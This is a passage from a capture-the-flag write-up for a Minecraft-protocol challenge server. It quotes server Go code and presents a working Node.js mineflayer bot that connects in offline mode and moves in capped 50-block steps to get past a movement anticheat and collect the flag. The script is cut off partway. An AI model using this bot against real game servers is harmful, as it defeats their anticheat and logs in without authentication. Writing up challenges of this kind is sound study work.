</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="nx">c</span><span class="p">.</span><span class="nf">SendPlayerChat</span><span class="p">(</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="nx">player</span><span class="p">.</span><span class="nx">UUID</span><span class="p">,</span><span class="w"> </span><span class="mi">0</span><span class="p">,</span><span class="w"> </span><span class="nx">signature</span><span class="p">,</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="o">&amp;</span><span class="nx">sign</span><span class="p">.</span><span class="nx">PackedMessageBody</span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="nx">PlainMsg</span><span class="p">:</span><span class="w"> </span><span class="nx">fmt</span><span class="p">.</span><span class="nf">Sprintf</span><span class="p">(</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                    </span><span class="s">&#34;ctf{try_harder}  Your Position: %d %d %d  Expected Position: 69420 69420 69420&#34;</span><span class="p">,</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                    </span><span class="nx">x</span><span class="p">,</span><span class="w"> </span><span class="nx">y</span><span class="p">,</span><span class="w"> </span><span class="nx">z</span><span class="p">),</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="nx">Timestamp</span><span class="p">:</span><span class="w"> </span><span class="nx">timestamp</span><span class="p">,</span><span class="w"> </span><span class="nx">Salt</span><span class="p">:</span><span class="w"> </span><span class="nb">int64</span><span class="p">(</span><span class="nx">salt</span><span class="p">),</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="nx">LastSeen</span><span class="p">:</span><span class="w"> </span><span class="p">[]</span><span class="nx">sign</span><span class="p">.</span><span class="nx">PackedSignature</span><span class="p">{},</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="p">},</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="kc">nil</span><span class="p">,</span><span class="w"> </span><span class="o">&amp;</span><span class="nx">sign</span><span class="p">.</span><span class="nx">FilterMask</span><span class="p">{</span><span class="nx">Type</span><span class="p">:</span><span class="w"> </span><span class="mi">0</span><span class="p">},</span><span class="w"> </span><span class="o">&amp;</span><span class="nx">chatType</span><span class="p">,</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">)</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w"> </span><span class="k">else</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="nx">c</span><span class="p">.</span><span class="nf">SendPlayerChat</span><span class="p">(</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="nx">player</span><span class="p">.</span><span class="nx">UUID</span><span class="p">,</span><span class="w"> </span><span class="mi">0</span><span class="p">,</span><span class="w"> </span><span class="nx">signature</span><span class="p">,</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="o">&amp;</span><span class="nx">sign</span><span class="p">.</span><span class="nx">PackedMessageBody</span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="nx">PlainMsg</span><span class="p">:</span><span class="w"> </span><span class="s">&#34;ctf{redacted}&#34;</span><span class="p">,</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="nx">Timestamp</span><span class="p">:</span><span class="w"> </span><span class="nx">timestamp</span><span class="p">,</span><span class="w"> </span><span class="nx">Salt</span><span class="p">:</span><span class="w"> </span><span class="nb">int64</span><span class="p">(</span><span class="nx">salt</span><span class="p">),</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="nx">LastSeen</span><span class="p">:</span><span class="w"> </span><span class="p">[]</span><span class="nx">sign</span><span class="p">.</span><span class="nx">PackedSignature</span><span class="p">{},</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="p">},</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="kc">nil</span><span class="p">,</span><span class="w"> </span><span class="o">&amp;</span><span class="nx">sign</span><span class="p">.</span><span class="nx">FilterMask</span><span class="p">{</span><span class="nx">Type</span><span class="p">:</span><span class="w"> </span><span class="mi">0</span><span class="p">},</span><span class="w"> </span><span class="o">&amp;</span><span class="nx">chatType</span><span class="p">,</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">)</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
</span></span></span></code></pre></div><p><strong>2. The anticheat threshold</strong></p>
<p>In <code>server/world/tick.go</code>, the server checks how far you moved between updates. If a single step is <strong>over 100 blocks</strong>, it teleports you back (classic &ldquo;moved too quickly&rdquo; behavior). Anything <strong>‚â§ 100</strong> is accepted:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-go" data-lang="go"><span class="line"><span class="cl"><span class="nx">delta</span><span class="w"> </span><span class="o">:=</span><span class="w"> </span><span class="p">[</span><span class="o">...</span><span class="p">]</span><span class="kt">float64</span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="nx">inputs</span><span class="p">.</span><span class="nx">Position</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="nx">p</span><span class="p">.</span><span class="nx">Position</span><span class="p">[</span><span class="mi">0</span><span class="p">],</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="nx">inputs</span><span class="p">.</span><span class="nx">Position</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="nx">p</span><span class="p">.</span><span class="nx">Position</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="nx">inputs</span><span class="p">.</span><span class="nx">Position</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="nx">p</span><span class="p">.</span><span class="nx">Position</span><span class="p">[</span><span class="mi">2</span><span class="p">],</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="nx">distance</span><span class="w"> </span><span class="o">:=</span><span class="w"> </span><span class="nx">math</span><span class="p">.</span><span class="nf">Sqrt</span><span class="p">(</span><span class="nx">delta</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">*</span><span class="nx">delta</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="nx">delta</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span><span class="o">*</span><span class="nx">delta</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="nx">delta</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span><span class="o">*</span><span class="nx">delta</span><span class="p">[</span><span class="mi">2</span><span class="p">])</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="k">if</span><span class="w"> </span><span class="nx">distance</span><span class="w"> </span><span class="p">&gt;</span><span class="w"> </span><span class="mi">100</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="nx">teleportID</span><span class="w"> </span><span class="o">:=</span><span class="w"> </span><span class="nx">c</span><span class="p">.</span><span class="nf">SendPlayerPosition</span><span class="p">(</span><span class="nx">p</span><span class="p">.</span><span class="nx">Position</span><span class="p">,</span><span class="w"> </span><span class="nx">p</span><span class="p">.</span><span class="nx">Rotation</span><span class="p">)</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="nx">p</span><span class="p">.</span><span class="nx">teleport</span><span class="w"> </span><span class="p">=</span><span class="w"> </span><span class="o">&amp;</span><span class="nx">TeleportRequest</span><span class="p">{</span><span class="w"> </span><span class="nx">ID</span><span class="p">:</span><span class="w"> </span><span class="nx">teleportID</span><span class="p">,</span><span class="w"> </span><span class="nx">Position</span><span class="p">:</span><span class="w"> </span><span class="nx">p</span><span class="p">.</span><span class="nx">Position</span><span class="p">,</span><span class="w"> </span><span class="nx">Rotation</span><span class="p">:</span><span class="w"> </span><span class="nx">p</span><span class="p">.</span><span class="nx">Rotation</span><span class="w"> </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">}</span><span class="w"> </span><span class="k">else</span><span class="w"> </span><span class="k">if</span><span class="w"> </span><span class="nx">inputs</span><span class="p">.</span><span class="nx">Position</span><span class="p">.</span><span class="nf">IsValid</span><span class="p">()</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="nx">p</span><span class="p">.</span><span class="nx">pos0</span><span class="w"> </span><span class="p">=</span><span class="w"> </span><span class="nx">inputs</span><span class="p">.</span><span class="nx">Position</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="nx">p</span><span class="p">.</span><span class="nx">rot0</span><span class="w"> </span><span class="p">=</span><span class="w"> </span><span class="nx">inputs</span><span class="p">.</span><span class="nx">Rotation</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="nx">p</span><span class="p">.</span><span class="nx">OnGround</span><span class="w"> </span><span class="p">=</span><span class="w"> </span><span class="nx">inputs</span><span class="p">.</span><span class="nx">OnGround</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">}</span><span class="w">
</span></span></span></code></pre></div><p><strong>3. Offline mode</strong></p>
<p>The included <code>server/config.toml</code> enables offline logins:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-toml" data-lang="toml"><span class="line"><span class="cl"><span class="nx">online-mode</span> <span class="p">=</span> <span class="kc">false</span>
</span></span><span class="line"><span class="cl"><span class="nx">enforce-secure-profile</span> <span class="p">=</span> <span class="kc">false</span>
</span></span><span class="line"><span class="cl"><span class="nx">listen-address</span> <span class="p">=</span> <span class="s2">&#34;0.0.0.0:25565&#34;</span>
</span></span></code></pre></div><p>That‚Äôs why a plain protocol bot can connect with <code>auth: 'offline'</code>.</p>
<h4 id="solution">Solution<a hidden class="anchor" aria-hidden="true" href="#solution">#</a></h4>
<p>Given the above, solving reduces to:</p>
<ol>
<li><strong>Connect in offline mode</strong> to the server.</li>
<li><strong>Walk</strong> to <code>(69420, 69420, 69420)</code> using hops <strong>‚â§ 100 blocks</strong> per update so the server accepts our position.</li>
<li><strong>Send <code>!flag</code></strong> and capture any chat message containing <code>ctf{</code>.</li>
</ol>
<p>The provided <code>message.txt</code> already gives a working Node exploit using <strong>mineflayer</strong> and <strong>vec3</strong> that does exactly this: it connects offline, steps toward the target with a per-step cap (conservative <strong>50</strong> ‚â§ 100), then sends <code>!flag</code> and prints any chat containing <code>ctf{</code>. </p>
<p>Minimal usage (from the exploit header):</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">npm i mineflayer vec3
</span></span><span class="line"><span class="cl">node exploit_flag.js --host &lt;SERVER_IP&gt; --port <span class="m">25565</span> --name Flaggy
</span></span></code></pre></div><p>Key ideas in the bot:</p>
<ul>
<li><strong>Bounded steps</strong> to bypass the &gt;100 anti-cheat:</li>
</ul>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="cl"><span class="kr">const</span> <span class="nx">MAX_STEP</span> <span class="o">=</span> <span class="mi">50</span>
</span></span><span class="line"><span class="cl"><span class="kd">function</span> <span class="nx">stepTowards</span><span class="p">(</span><span class="nx">cur</span><span class="p">,</span> <span class="nx">dst</span><span class="p">,</span> <span class="nx">maxStep</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="kr">const</span> <span class="nx">dx</span> <span class="o">=</span> <span class="nx">dst</span><span class="p">.</span><span class="nx">x</span> <span class="o">-</span> <span class="nx">cur</span><span class="p">.</span><span class="nx">x</span><span class="p">,</span> <span class="nx">dy</span> <span class="o">=</span> <span class="nx">dst</span><span class="p">.</span><span class="nx">y</span> <span class="o">-</span> <span class="nx">cur</span><span class="p">.</span><span class="nx">y</span><span class="p">,</span> <span class="nx">dz</span> <span class="o">=</span> <span class="nx">dst</span><span class="p">.</span><span class="nx">z</span> <span class="o">-</span> <span class="nx">cur</span><span class="p">.</span><span class="nx">z</span>
</span></span><span class="line"><span class="cl">  <span class="kr">const</span> <span class="nx">dist</span> <span class="o">=</span> <span class="nb">Math</span><span class="p">.</span><span class="nx">hypot</span><span class="p">(</span><span class="nx">dx</span><span class="p">,</span> <span class="nx">dy</span><span class="p">,</span> <span class="nx">dz</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span><span class="nx">dist</span> <span class="o">===</span> <span class="mi">0</span><span class="p">)</span> <span class="k">return</span> <span class="nx">cur</span>
</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span><span class="nx">dist</span> <span class="o">&lt;=</span> <span class="nx">maxStep</span><span class="p">)</span> <span class="k">return</span> <span class="nx">dst</span>
</span></span><span class="line"><span class="cl">  <span class="kr">const</span> <span class="nx">s</span> <span class="o">=</span> <span class="nx">maxStep</span> <span class="o">/</span> <span class="nx">dist</span>
</span></span><span class="line"><span class="cl">  <span class="k">return</span> <span class="k">new</span> <span class="nx">Vec3</span><span class="p">(</span><span class="nx">cur</span><span class="p">.</span><span class="nx">x</span> <span class="o">+</span> <span class="nx">dx</span><span class="o">*</span><span class="nx">s</span><span class="p">,</span> <span class="nx">cur</span><span class="p">.</span><span class="nx">y</span> <span class="o">+</span> <span class="nx">dy</span><span class="o">*</span><span class="nx">s</span><span class="p">,</span> <span class="nx">cur</span><span class="p">.</span><span class="nx">z</span> <span class="o">+</span> <span class="nx">dz</span><span class="o">*</span><span class="nx">s</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><ul>
<li><strong>Raw position packets</strong> every ~200 ms so the server updates your position without pathfinding.</li>
<li>On arrival, <strong>send <code>!flag</code></strong> and <strong>grep chat</strong> for <code>ctf{</code>.</li>
</ul>
<p>Once positioned <strong>exactly</strong> at <code>(69420, 69420, 69420)</code>, the server‚Äôs <code>!flag</code> handler takes the <code>else</code> branch and replies with the real flag in chat.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="cl"><span class="ch">#!/usr/bin/env node
</span></span></span><span class="line"><span class="cl"><span class="ch"></span><span class="kr">const</span> <span class="nx">mineflayer</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="s1">&#39;mineflayer&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="kr">const</span> <span class="p">{</span> <span class="nx">Vec3</span> <span class="p">}</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="s1">&#39;vec3&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kd">function</span> <span class="nx">parseArgs</span> <span class="p">()</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="kr">const</span> <span class="nx">args</span> <span class="o">=</span> <span class="p">{</span> <span class="nx">host</span><span class="o">:</span> <span class="s1">&#39;127.0.0.1&#39;</span><span class="p">,</span> <span class="nx">port</span><span class="o">:</span> <span class="mi">25565</span><span class="p">,</span> <span class="nx">name</span><span class="o">:</span> <span class="s1">&#39;Flaggy&#39;</span><span class="p">,</span> <span class="nx">version</span><span class="o">:</span> <span class="s1">&#39;1.19.4&#39;</span> <span class="p">}</span>
</span></span><span class="line"><span class="cl">  <span class="k">for</span> <span class="p">(</span><span class="kd">let</span> <span class="nx">i</span> <span class="o">=</span> <span class="mi">2</span><span class="p">;</span> <span class="nx">i</span> <span class="o">&lt;</span> <span class="nx">process</span><span class="p">.</span><span class="nx">argv</span><span class="p">.</span><span class="nx">length</span><span class="p">;</span> <span class="nx">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="kr">const</span> <span class="nx">a</span> <span class="o">=</span> <span class="nx">process</span><span class="p">.</span><span class="nx">argv</span><span class="p">[</span><span class="nx">i</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="nx">a</span> <span class="o">===</span> <span class="s1">&#39;--host&#39;</span><span class="p">)</span> <span class="nx">args</span><span class="p">.</span><span class="nx">host</span> <span class="o">=</span> <span class="nx">process</span><span class="p">.</span><span class="nx">argv</span><span class="p">[</span><span class="o">++</span><span class="nx">i</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">    <span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="nx">a</span> <span class="o">===</span> <span class="s1">&#39;--port&#39;</span><span class="p">)</span> <span class="nx">args</span><span class="p">.</span><span class="nx">port</span> <span class="o">=</span> <span class="nb">parseInt</span><span class="p">(</span><span class="nx">process</span><span class="p">.</span><span class="nx">argv</span><span class="p">[</span><span class="o">++</span><span class="nx">i</span><span class="p">],</span> <span class="mi">10</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="nx">a</span> <span class="o">===</span> <span class="s1">&#39;--name&#39;</span><span class="p">)</span> <span class="nx">args</span><span class="p">.</span><span class="nx">name</span> <span class="o">=</span> <span class="nx">process</span><span class="p">.</span><span class="nx">argv</span><span class="p">[</span><span class="o">++</span><span class="nx">i</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">    <span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="nx">a</span> <span class="o">===</span> <span class="s1">&#39;--version&#39;</span><span class="p">)</span> <span class="nx">args</span><span class="p">.</span><span class="nx">version</span> <span class="o">=</span> <span class="nx">process</span><span class="p">.</span><span class="nx">argv</span><span class="p">[</span><span class="o">++</span><span class="nx">i</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="cl">  <span class="k">return</span> <span class="nx">args</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kr">const</span> <span class="nx">TARGET</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Vec3</span><span class="p">(</span><span class="mi">69420</span><span class="p">,</span> <span class="mi">69420</span><span class="p">,</span> <span class="mi">69420</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="kr">const</span> <span class="nx">MAX_STEP</span> <span class="o">=</span> <span class="mi">50</span> <span class="c1">// be conservative: strictly under server&#39;s &gt;100 check
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
</span></span><span class="line"><span class="cl"><span class="kd">function</span> <span class="nx">stepTowards</span> <span class="p">(</span><span class="nx">cur</span><span class="p">,</span> <span class="nx">dst</span><span class="p">,</span> <span class="nx">maxStep</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="kr">const</span> <span class="nx">dx</span> <span class="o">=</span> <span class="nx">dst</span><span class="p">.</span><span class="nx">x</span> <span class="o">-</span> <span class="nx">cur</span><span class="p">.</span><span class="nx">x</span>
</span></span><span class="line"><span class="cl">  <span class="kr">const</span> <span class="nx">dy</span> <span class="o">=</span> <span class="nx">dst</span><span class="p">.</span><span class="nx">y</span> <span class="o">-</span> <span class="nx">cur</span><span class="p">.</span><span class="nx">y</span>
</span></span><span class="line"><span class="cl">  <span class="kr">const</span> <span class="nx">dz</span> <span class="o">=</span> <span class="nx">dst</span><span class="p">.</span><span class="nx">z</span> <span class="o">-</span> <span class="nx">cur</span><span class="p">.</span><span class="nx">z</span>
</span></span><span class="line"><span class="cl">  <span class="kr">const</span> <span class="nx">dist</span> <span class="o">=</span> <span class="nb">Math</span><span class="p">.</span><span class="nx">sqrt</span><span class="p">(</span><span class="nx">dx</span> <span class="o">*</span> <span class="nx">dx</span> <span class="o">+</span> <span class="nx">dy</span> <span class="o">*</span> <span class="nx">dy</span> <span class="o">+</span> <span class="nx">dz</span> <span class="o">*</span> <span class="nx">dz</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span><span class="nx">dist</span> <span class="o">===</span> <span class="mi">0</span><span class="p">)</span> <span class="k">return</span> <span class="nx">cur</span>
</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span><span class="nx">dist</span> <span class="o">&lt;=</span> <span class="nx">maxStep</span><span class="p">)</span> <span class="k">return</span> <span class="k">new</span> <span class="nx">Vec3</span><span class="p">(</span><span class="nx">dst</span><span class="p">.</span><span class="nx">x</span><span class="p">,</span> <span class="nx">dst</span><span class="p">.</span><span class="nx">y</span><span class="p">,</span> <span class="nx">dst</span><span class="p">.</span><span class="nx">z</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">  <span class="kr">const</span> <span class="nx">s</span> <span class="o">=</span> <span class="nx">maxStep</span> <span class="o">/</span> <span class="nx">dist</span>
</span></span><span class="line"><span class="cl">  <span class="k">return</span> <span class="k">new</span> <span class="nx">Vec3</span><span class="p">(</span><span class="nx">cur</span><span class="p">.</span><span class="nx">x</span> <span class="o">+</span> <span class="nx">dx</span> <span class="o">*</span> <span class="nx">s</span><span class="p">,</span> <span class="nx">cur</span><span class="p">.</span><span class="nx">y</span> <span class="o">+</span> <span class="nx">dy</span> <span class="o">*</span> <span class="nx">s</span><span class="p">,</span> <span class="nx">cur</span><span class="p">.</span><span class="nx">z</span> <span class="o">+</span> <span class="nx">dz</span> <span class="o">*</span> <span class="nx">s</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kr">async</span> <span class="kd">function</span> <span class="nx">main</span> <span class="p">()</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="kr">const</span> <span class="p">{</span> <span class="nx">host</span><span class="p">,</span> <span class="nx">port</span><span class="p">,</span> <span class="nx">name</span><span class="p">,</span> <span class="nx">version</span> <span class="p">}</span> <span class="o">=</span> <span class="nx">parseArgs</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">  <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">&#39;[INIT] Config:&#39;</span><span class="p">,</span> <span class="p">{</span> <span class="nx">host</span><span class="p">,</span> <span class="nx">port</span><span class="p">,</span> <span class="nx">name</span><span class="p">,</span> <span class="nx">version</span> <span class="p">})</span>
</span></span><span class="line"><span class="cl">  <span class="kr">const</span> <span class="nx">createOpts</span> <span class="o">=</span> <span class="p">{</span> <span class="nx">host</span><span class="p">,</span> <span class="nx">port</span><span class="p">,</span> <span class="nx">username</span><span class="o">:</span> <span class="nx">name</span><span class="p">,</span> <span class="nx">auth</span><span class="o">:</span> <span class="s1">&#39;offline&#39;</span> <span class="p">}</span>
</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span><span class="nx">version</span> <span class="o">&amp;&amp;</span> <span class="nx">version</span><span class="p">.</span><span class="nx">toLowerCase</span><span class="p">()</span> <span class="o">!==</span> <span class="s1">&#39;auto&#39;</span><span class="p">)</span> <span class="nx">createOpts</span><span class="p">.</span><span class="nx">version</span> <span class="o">=</span> <span class="nx">version</span>
</span></span><span class="line"><span class="cl">  <span class="k">else</span> <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">&#39;[INIT] Version: auto&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">  <span class="kr">const</span> <span class="nx">bot</span> <span class="o">=</span> <span class="nx">mineflayer</span><span class="p">.</span><span class="nx">createBot</span><span class="p">(</span><span class="nx">createOpts</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">  <span class="nx">bot</span><span class="p">.</span><span class="nx">once</span><span class="p">(</span><span class="s1">&#39;login&#39;</span><span class="p">,</span> <span class="p">()</span> <span class="p">=&gt;</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">&#39;[STATE] Logged in, waiting for spawn...&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">  <span class="p">})</span>
</span></span><span class="line"><span class="cl">  <span class="nx">bot</span><span class="p">.</span><span class="nx">once</span><span class="p">(</span><span class="s1">&#39;kicked&#39;</span><span class="p">,</span> <span class="p">(</span><span class="nx">reason</span><span class="p">)</span> <span class="p">=&gt;</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nx">console</span><span class="p">.</span><span class="nx">error</span><span class="p">(</span><span class="s1">&#39;[STATE] Kicked:&#39;</span><span class="p">,</span> <span class="nx">reason</span><span class="o">?</span><span class="p">.</span><span class="nx">toString</span><span class="o">?</span><span class="p">.()</span> <span class="o">||</span> <span class="nx">reason</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">  <span class="p">})</span>
</span></span><span class="line"><span class="cl">  <span class="nx">bot</span><span class="p">.</span><span class="nx">once</span><span class="p">(</span><span class="s1">&#39;error&#39;</span><span class="p">,</span> <span class="p">(</span><span class="nx">err</span><span class="p">)</span> <span class="p">=&gt;</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nx">console</span><span class="p">.</span><span class="nx">error</span><span class="p">(</span><span class="s1">&#39;[STATE] Error:&#39;</span><span class="p">,</span> <span class="nx">err</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">  <span class="p">})</span>
</span></span><span class="line"><span class="cl">  <span class="nx">bot</span><span class="p">.</span><span class="nx">once</span><span class="p">(</span><span class="s1">&#39;end&#39;</span><span class="p">,</span> <span class="p">()</span> <span class="p">=&gt;</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">&#39;[STATE] Disconnected&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">  <span class="p">})</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">  <span class="nx">bot</span><span class="p">.</span><span class="nx">on</span><span class="p">(</span><span class="s1">&#39;message&#39;</span><span class="p">,</span> <span class="p">(</span><span class="nx">cm</span><span class="p">)</span> <span class="p">=&gt;</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">try</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">      <span class="kr">const</span> <span class="nx">s</span> <span class="o">=</span> <span class="nx">cm</span><span class="p">.</span><span class="nx">toString</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">      <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">&#39;[CHAT]&#39;</span><span class="p">,</span> <span class="nx">s</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">      <span class="k">if</span> <span class="p">(</span><span class="nx">s</span><span class="p">.</span><span class="nx">includes</span><span class="p">(</span><span class="s1">&#39;ctf{&#39;</span><span class="p">))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">s</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="nx">bot</span><span class="p">.</span><span class="nx">end</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">        <span class="nx">process</span><span class="p">.</span><span class="nx">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">      <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span> <span class="k">catch</span> <span class="p">(</span><span class="nx">_</span><span class="p">)</span> <span class="p">{}</span>
</span></span><span class="line"><span class="cl">  <span class="p">})</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">  <span class="kd">let</span> <span class="nx">movementStarted</span> <span class="o">=</span> <span class="kc">false</span>
</span></span><span class="line"><span class="cl">  <span class="kd">let</span> <span class="nx">movementState</span> <span class="o">=</span> <span class="kc">null</span>
</span></span><span class="line"><span class="cl">  <span class="kd">let</span> <span class="nx">teleportReady</span> <span class="o">=</span> <span class="kc">true</span>
</span></span><span class="line"><span class="cl">  <span class="kd">function</span> <span class="nx">startMovement</span> <span class="p">(</span><span class="nx">reason</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="nx">movementStarted</span><span class="p">)</span> <span class="k">return</span>
</span></span><span class="line"><span class="cl">    <span class="nx">movementStarted</span> <span class="o">=</span> <span class="kc">true</span>
</span></span><span class="line"><span class="cl">    <span class="kr">const</span> <span class="nx">start</span> <span class="o">=</span> <span class="nx">bot</span><span class="p">.</span><span class="nx">entity</span><span class="p">.</span><span class="nx">position</span><span class="p">.</span><span class="nx">clone</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">    <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="sb">`[STATE] Starting movement (</span><span class="si">${</span><span class="nx">reason</span><span class="si">}</span><span class="sb">) at`</span><span class="p">,</span> <span class="p">{</span>
